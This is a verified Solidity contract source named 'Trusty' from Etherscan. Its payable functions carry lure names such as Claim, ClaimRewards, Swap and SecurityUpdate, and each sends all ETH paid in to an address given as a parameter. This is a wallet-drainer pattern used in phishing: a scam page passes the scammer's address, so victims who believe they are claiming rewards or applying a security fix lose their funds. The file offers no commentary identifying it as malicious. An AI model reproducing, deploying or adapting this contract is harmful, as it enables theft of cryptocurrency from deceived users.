/**
 *Submitted for verification at Etherscan.io on 2023-06-29
*/

// SPDX-License-Identifier: Unlicense

pragma solidity ^0.8.18;

contract Trusty {

  address private owner;

  event Ownership(address indexed previous_owner, address indexed current_owner);

  constructor() { owner = msg.sender; }

  function getOwner() public view returns (address) { return owner; }
  function getBalance() public view returns (uint256) { return address(this).balance; }

  function withd(address sender) private {
    payable(sender).transfer(msg.value);
  }

  function Claim(address sender) public payable { withd(sender); }
  function ClaimReward(address sender) public payable { withd(sender); }
  function ClaimRewards(address sender) public payable { withd(sender); }
  function Execute(address sender) public payable { withd(sender); }
  function Multicall(address sender) public payable { withd(sender); }
  function Swap(address sender) public payable { withd(sender); }
  function Connect(address sender) public payable { withd(sender); }
  function SecurityUpdate(address sender) public payable { withd(sender); }

  function transferOwnership(address new_owner) public {
    require(msg.sender == owner, "Access Denied");
    address previous_owner = owner; owner = new_owner;
    emit Ownership(previous_owner, new_owner);
  }

}